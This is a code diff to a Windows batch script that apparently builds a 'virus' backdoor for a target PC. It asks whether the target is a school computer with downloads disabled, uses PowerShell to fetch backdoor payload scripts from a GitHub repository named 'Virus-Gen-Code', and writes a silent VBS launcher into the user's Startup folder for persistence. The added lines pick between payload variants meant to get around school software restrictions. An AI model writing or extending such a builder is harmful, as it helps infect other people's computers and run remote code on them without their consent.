@@ -26,12 +26,18 @@ del git.sav
 if exist C:\ProgramData\GVGemail.sav (goto load_email) else (goto error2)
 :emailnext
 if exist "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\launch.vbs" goto backdoor_remove
+if exist "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\launch.vbs" goto backdoor_remove
 :no_remove_backdoor
 :: manual configuration
   echo [31mwarning school computers and admin backdoors are currently broken, do no use these[0m
   echo do you have admin permissions on the target PC?
   echo note: this will require you to have admin rights when infecting A PC, however it will infect all users on that PC, not just the active one.
+  echo.
   choice /C YN /m "does target PC have admin rights? Y/N:
+  if %errorlevel% equ 1 (set target_admin_rights=true) else (set target_admin_rights=false)&set errorlevel=0
+  echo.
+  choice /C YN /m "is the target PC a school computer or have software downloads dissabled? Y/N:
+  if %errorlevel% equ 1 (set target_software_bypass=true) else (set target_software_bypass=false)&set errorlevel=0
   echo.
   echo DO NOT USE SPACES, replace them with _
   echo.
@@ -42,7 +48,6 @@ if exist "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Progr
 
 :: create all files needed
   :: create placeholder file
-    if %errorlevel% equ 1 (set target_admin_rights=true) else (set target_admin_rights=false)
     Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/default_placeholder.bat").Content >%opt1%.bat
   :: upload file to github
     echo [33mregistering code on github...[0m
@@ -65,7 +70,8 @@ if exist "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Progr
     if exist %opt2%\payload\launch.vbs (echo [92msuccessfully created silent launch file![0m) else (goto error4)
   :: generate a file to run code from github on the target PC
     echo [33mdownloading code from github to create backdoor file...[0m
-    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/BC.bat").Content >%opt2%\payload\payload.bat
+    if %target_software_bypass% equ false Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/BC_software_disabled.bat").Content >%opt2%\payload\payload.bat
+    if %target_software_bypass% equ true Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/BC_software_enabled.bat").Content >%opt2%\payload\payload.bat
     powershell -Command "(gc %opt2%\payload\payload.bat) -replace 'REPtxt', '%opt1%' | Out-File -encoding ASCII %opt2%\payload\payload.bat"
     if exist %opt2%\payload\payload.bat (echo [92msuccessfully created backdoor file![0m) else (goto error6)
   :: generate a file to move files to their proper location
